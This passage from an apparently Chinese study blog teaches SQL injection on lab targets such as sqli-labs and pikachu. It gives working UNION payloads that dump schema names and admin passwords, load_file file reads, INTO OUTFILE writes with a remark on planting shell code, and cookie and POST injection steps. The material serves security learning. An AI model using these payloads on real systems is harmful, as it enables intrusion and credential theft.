+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">--记录所有表名信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Table_catalog</td>
+<td>数据表登记目录</td>
+</tr>
+<tr>
+<td>Table_schema</td>
+<td>数据表所属的数据库名</td>
+</tr>
+<tr>
+<td>Table_name</td>
+<td>表名称</td>
+</tr>
+<tr>
+<td>Table_type</td>
+<td>表类型[system view|base table]</td>
+</tr>
+<tr>
+<td>Engine</td>
+<td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td>
+</tr>
+<tr>
+<td>Version</td>
+<td>版本，默认值10</td>
+</tr>
+<tr>
+<td>Row_format</td>
+<td>行格式[Compact|Dynamic|Fixed]</td>
+</tr>
+<tr>
+<td>Table_rows</td>
+<td>表里所存多少行数据</td>
+</tr>
+<tr>
+<td>Avg_row_length</td>
+<td>平均行长度</td>
+</tr>
+<tr>
+<td>Data_length</td>
+<td>数据长度</td>
+</tr>
+<tr>
+<td>Max_data_length</td>
+<td>最大数据长度</td>
+</tr>
+<tr>
+<td>Index_length</td>
+<td>索引长度</td>
+</tr>
+<tr>
+<td>Data_free</td>
+<td>空间碎片</td>
+</tr>
+<tr>
+<td>Auto_increment</td>
+<td>做自增主键的自动增量当前值</td>
+</tr>
+<tr>
+<td>Create_time</td>
+<td>表的创建时间</td>
+</tr>
+<tr>
+<td>Update_time</td>
+<td>表的更新时间</td>
+</tr>
+<tr>
+<td>Check_time</td>
+<td>表的检查时间</td>
+</tr>
+<tr>
+<td>Table_collation</td>
+<td>表的字符校验编码集</td>
+</tr>
+<tr>
+<td>Checksum</td>
+<td>校验和</td>
+</tr>
+<tr>
+<td>Create_options</td>
+<td>创建选项</td>
+</tr>
+<tr>
+<td>Table_comment</td>
+<td>表的注释、备注</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">--记录所有列明信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>- </p>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>表所有者（对于schema的名称）</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>column_name</td>
+<td>列名</td>
+</tr>
+<tr>
+<td>ordinal_position</td>
+<td>列标识号</td>
+</tr>
+<tr>
+<td>column_default</td>
+<td>列的默认值</td>
+</tr>
+<tr>
+<td>is_nullable</td>
+<td>列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no</td>
+</tr>
+<tr>
+<td>data_type</td>
+<td>系统提供的数据类型</td>
+</tr>
+<tr>
+<td>character_maximum_length</td>
+<td>以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型</td>
+</tr>
+<tr>
+<td>character_octet_length</td>
+<td>以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu</td>
+</tr>
+<tr>
+<td>numeric_precision</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null</td>
+</tr>
+<tr>
+<td>numeric_precision_radix</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null</td>
+</tr>
+<tr>
+<td>numeric_scale</td>
+<td>近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null</td>
+</tr>
+<tr>
+<td>datetime_precision</td>
+<td>datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null</td>
+</tr>
+<tr>
+<td>character_set_catalog</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null</td>
+</tr>
+<tr>
+<td>character_set_schema</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null</td>
+</tr>
+<tr>
+<td>character_set_name</td>
+<td>如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null</td>
+</tr>
+<tr>
+<td>collation_catalog</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null</td>
+</tr>
+<tr>
+<td>collation_schema</td>
+<td>返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null</td>
+</tr>
+<tr>
+<td>collation_name</td>
+<td>如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。</td>
+</tr>
+<tr>
+<td>domain_catalog</td>
+<td>如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null</td>
+</tr>
+<tr>
+<td>domain_schema</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null</td>
+</tr>
+<tr>
+<td>domain_name</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span>schemata<span class="token comment">--记录mysql中所有数据库的名称的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schema_name</td>
+<td>数据库名称</td>
+</tr>
+<tr>
+<td>default_character_set_name</td>
+<td>数据库编码</td>
+</tr>
+<tr>
+<td>default_collation_name</td>
+<td>数据库排序规则</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h3 id="6-相关防注入"><a href="#6-相关防注入" class="headerlink" title="6.相关防注入"></a>6.相关防注入</h3><blockquote>
+<p>1.自带防御，魔术引号，magic_qutotes_gpc=on</p>
+<p>2.内置函数进行过滤，puh中如果确定数据类型，可以用is_int()判断是否为整数</p>
+<p>3.自定义关键字过滤，如select关键字，大小写，编码</p>
+<p>4.WAF防护软件：安全狗，宝塔，大部分都为过滤关键字 </p>
+</blockquote>
+<p>limit x,y 进行x,y的筛选</p>
+<h3 id="7案列"><a href="#7案列" class="headerlink" title="7案列"></a>7案列</h3><p><strong>tables，columns这两个的应用</strong></p>
+<h4 id="（1）爆出数据库的所有表"><a href="#（1）爆出数据库的所有表" class="headerlink" title="（1）爆出数据库的所有表"></a>（1）爆出数据库的所有表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span>
+<span class="token comment">--通过information_schema下的tables可以查询pikachu数据库下的所有表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="（2）爆出所有的列-字段名"><a href="#（2）爆出所有的列-字段名" class="headerlink" title="（2）爆出所有的列(字段名)"></a>（2）爆出所有的列(字段名)</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span>
+<span class="token comment">--通过information_schema下的columns可以查询某个表下面的所有字段</span>
+<span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="（3）跨站注入"><a href="#（3）跨站注入" class="headerlink" title="（3）跨站注入"></a>（3）跨站注入</h4><blockquote>
+<p>数据库A=网站A=数据库用户A</p>
+<p>​               表名</p>
+<p>​                          列名</p>
+<p>​                                     数据</p>
+<p>数据库B=网站B=数据库用户B</p>
+<p>​         …..</p>
+<p><strong>特点A网站只操作A网站的数据库，B网站只操作B网站的数据库</strong></p>
+<p>通过一个网站的数据库注入漏洞，注入另一个网站，条件：root型数据库</p>
+<p><strong>通过A注入B</strong></p>
+<blockquote>
+<p>MySQL <code>GROUP_CONCAT()</code>函数将组中的字符串连接成为具有各种选项的单个字符串。中间用逗号隔开</p>
+</blockquote>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
+<span class="token comment">#爆出MySQL中数据库表中的第一个数据库的名称，因为有LIMIT 0,1，所以是第一个</span>
+<span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schamata
+<span class="token comment">#显示MySQL中数据库表中所有数据库的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>1)查看当前使用的数据库</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413074049.PNG"></p>
+<p><strong>1）爆出所有数据库名字</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
+<span class="token comment">#爆出MySQL中数据库表中所有数据库的名称，并且用逗号分割，也是应为limit的限制</span>
+<span class="token comment">#因为users查询出来的是三个字段，所以联合查询查询出来的也是要是三个字段</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220412220749.PNG"></p>
+<p><strong>2）爆出的bees数据库下的所有表</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'bees'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073204.PNG"></p>
+<p><strong>3)爆出bees数据库下的bees_admin表的所有字段</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'bees_admin'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073638.PNG"></p>
+<p><strong>4)获取指定数据</strong></p>
+<p>获取用admin_name,admin_password两个字段的数据</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>admin_name<span class="token punctuation">,</span>admin_password <span class="token keyword">from</span> bees<span class="token punctuation">.</span>bees_admin <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
+<span class="token comment">#注意后面要指定查询数据库下面的表bees.bees_admin，即bees数据库下的bees_admin表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413144436.PNG"></p>
+</blockquote>
+<h4 id="（4）文件读取"><a href="#（4）文件读取" class="headerlink" title="（4）文件读取"></a>（4）文件读取</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/.txt'</span><span class="token punctuation">)</span>
+<span class="token comment">#注意添加冒号与斜杠的写法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><a href="%5B(18%E6%9D%A1%E6%B6%88%E6%81%AF">常见load_file()读取敏感文件</a> 常见的load_file()读取的敏感信息_weixin_30292843的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a>))</p>
+<p><strong>①文件读取的类型</strong></p>
+<ul>
+<li>读取服务器默认路径对应的文件</li>
+<li>读取随机路径的文件（网站路径）</li>
+</ul>
+<p><strong>②路径获取的常见方法</strong></p>
+<ul>
+<li>报错显示（乱输入信息爆出一些文件路径），</li>
+<li>遗留文件（站长调试时留下的文件），</li>
+<li>漏洞报错（明确搭建的平台，搜索相关的漏洞，来获取文件的路径），</li>
+<li>平台配置文件（读取读取配置信息来获取网站的文件的路径）</li>
+<li>爆破（网站的常见路径，不同系统常见的路径，没办法的办法）</li>
+</ul>
+<p><strong>③文件的读取</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/reds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>读取的内容为：sqlreadfile</p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413152359.PNG"></p>
+<p><strong>④文件的写入</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\inetpub\\target\\sqlilabs\\write.txt'</span><span class="token comment">-- LIMIT 0,1</span>
+<span class="token comment">#注意后面有--注释，在url中要--+来进行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>当把x的内容换成shell代码后就实现了恶意代码的植入</strong></p>
+<ul>
+<li>php魔术引号的过滤（内置安全开关）magic_qutotes_gpc(php的安装目录下面)</li>
+</ul>
+<blockquote>
+<p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，对__GET以及进行数据库操作的sql进行转义处理，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。防止sql注入</p>
+<p>当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。<br>php中的magic_quotes_gpc是配置在php.ini中的</p>
+<p>一、当PHP magic_quotes_gpc=on<br>如果此时你对输入的数据作了addslashes()处理，<br>那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠。<br>如果仅为magic_quotes_gpc=on，无再对写入数据库的字符串未经过任何处理。从数据库读出的字符串未作任何处理，则sql语句顺利执行，数据成功写入数据库，数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p>
+<p>二、当PHP magic_quotes_gpc=off<br>必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出<br>因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p>
+</blockquote>
+<ul>
+<li>效果</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413214455.PNG"></p>
+<ul>
+<li>解决方法，对路劲进行编码，把路径进行hex（十六进制，不添加单引号）</li>
+</ul>
+<h2 id="（三）请求方法的注入"><a href="#（三）请求方法的注入" class="headerlink" title="（三）请求方法的注入"></a>（三）请求方法的注入</h2><p>不同的请求方法获取的数据不同，明白数据的请求方法</p>
+<h3 id="1-GET：数据写在URL后面，用相应的方式传递参数"><a href="#1-GET：数据写在URL后面，用相应的方式传递参数" class="headerlink" title="1. GET：数据写在URL后面，用相应的方式传递参数"></a>1. GET：数据写在URL后面，用相应的方式传递参数</h3><h3 id="2-POST：大数据提交的方式，注入点在post"><a href="#2-POST：大数据提交的方式，注入点在post" class="headerlink" title="2. POST：大数据提交的方式，注入点在post"></a>2. POST：大数据提交的方式，注入点在post</h3><blockquote>
+<p>除了在url中体提交，也可以在网页输入上提交，如果需要与数据库连接的化就可能会存在注入，数据需要抓包才能看见。</p>
+<p>产生的地方，多半出现在登录框，查询框，等各种和数据库有交互的框数据。</p>
+<p>提交方式，与参数类型（单引号，双引号的干扰）</p>
+</blockquote>
+<blockquote>
+<p>案列</p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170914.PNG"></p>
+<p><strong>1)抓包结果可以看出，账户，密码的提交方式，猜测可能有注入点</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170958.PNG"></p>
+<p><strong>2）判断注入为字符型注入</strong></p>
+<p><strong>3）猜测字段数为2</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174009.PNG"></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415173440.PNG"></p>
+<p><strong>4)联合查询，查询数据库名与数据库用户</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174534.PNG"></p>
+<p><strong>5）获取改数据下的所有表</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">-- 'and password='password' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415180003.PNG"></p>
+<p><strong>6）获取emails表的字段(id,email_id两个字段)</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'emails'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181000.PNG"></p>
+<p><strong>7）获取数据</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id <span class="token punctuation">)</span><span class="token keyword">from</span> emails<span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415181413.PNG"></p>
+</blockquote>
+<p><strong>Request接受</strong></p>
+<p><strong>通过提交方式，绕过防护软件</strong></p>
+<p><strong>php的SERVER[]全局变量，获取操作系统，用户IP，等</strong></p>
+<h3 id="3-cookie注入"><a href="#3-cookie注入" class="headerlink" title="3.cookie注入"></a>3.cookie注入</h3><blockquote>
+<p>♦<strong>cookie注入的原理是：就要修改cookie的值，</strong></p>
+<p>　　♦cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p>
+<p>　　♦相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到<a target="_blank" rel="noopener" href="http://www.2cto.com/kf/ware/Java/">Java</a>script语言了。另外cookie注入的形</p>
+<p>　　♦<strong>成有两个必须条件，</strong></p>
+<p>　　　　<strong>条件1是：</strong>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的<a target="_blank" rel="noopener" href="http://www.2cto.com/database/">数据库</a>进行过滤。</p>
+<p>　　　　<strong>条件2是：</strong>在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p>
+<p><em><strong>*2.为什么要cookie注入？*</strong></em></p>
+<p>　　****♦****主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/insane-Mr-Li/p/9142681.html">cookie注入原理详解（一） - tooltime - 博客园 (cnblogs.com)</a>)</p>
+</blockquote>
+<p><strong>案例，sqlilabs 第20关</strong></p>
+<p><strong>1.代码审查</strong></p>
+<p><em>1）在源代码中，如果没有设置cookie的uname的值，就会对post提交的uname与passwd进行过滤检查</em></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142237.PNG"></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142310.PNG"></p>
+<p><em>2）如果设置cookie的uname值，并且没有设置submit，则在cookie中进行sql查询</em></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142326.PNG"></p>
+<p><em>3）如果设置cookie的uname值，且设置submit，则输出” Your Cookie is deleted”;</em></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416142338.PNG"></p>
+<p><strong>2.抓波修改cookie的值，并把submit删除，进行测试</strong></p>
+<p><strong>1)输入一个用户名和密码，点击提交，进行抓包。</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145857.PNG"></p>
+<p><strong>2）没更改cookie时的数据包</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150440.PNG"></p>
+<p><strong>3).删除submit与更改cookie值，判断字段数（为3）</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145929.PNG"></p>
+<p><strong>4).查询想要的字段</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416145952.PNG"></p>
+<p><strong>结果，数据库的名称为security，</strong></p>
+<p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220416150029.PNG"></p>
+<p><strong>5）就可以根据现有的注入点进行，暴库了</strong></p>
+<h3 id="4-json提交数据的注入"><a href="#4-json提交数据的注入" class="headerlink" title="4 json提交数据的注入"></a>4 json提交数据的注入</h3><p><strong>一、Json简介</strong><br>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”。</p>
+<p><strong>json语法</strong><br>数据在名称/值对中<br>数据由逗号分隔<br>大括号保存对象<br>中括号保存数组<br><strong>JSON 值</strong><br>JSON 值可以是：</p>
+<p>数字（整数或浮点数）  {“age”:30 }<br>字符串（在双引号中）  {“uname”:”yang”}<br>逻辑值（true 或 false） {“flag”:true }<br>数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}<br>对象（在大括号中）JSON 对象在大括号（{}）中书写：<br>null    { “runoob”:null }</p>
+<h2 id="（四）SQL-server注入"><a href="#（四）SQL-server注入" class="headerlink" title="（四）SQL server注入"></a>（四）SQL server注入</h2><p><strong>1.利用错误消息提取信息</strong>,having</p>
+<blockquote>
+<p>SQL Server 数据库是一个非常优秀的数据库，它可以准确地定位错误信息，这对攻击者来说是一件十分 美好的事情，因为攻击者可以通过错误消息提取自己想要的数据。</p>
+</blockquote>
+<p><strong>having的特点</strong></p>
+<blockquote>
+<p>1.having子句是用来对分组之后的信息进行过滤，在使用having时通常都会先使用group by。</p>
+<p>2.having子句出现的字段必须的是分组之后的组的整体信息，having子句不允许出现组内的详细信息</p>
+<p>3.having和where的异同:</p>
+<p>相同:<br>都是对数据过滤，只保留有效的数据；<br>where和having一样，  都不允许出现字段的别名；<br>只允许出现最原始的字段的名字。</p>
+<p>不同:<br>where是对原始的记录过滤having是对分组之后的记录过滤；<br>where必须的写在having的前面，顺序不可颠倒否则运行出错。</p>
+<p>4.利用having的报错可以爆出表名与字段名</p>
+</blockquote>
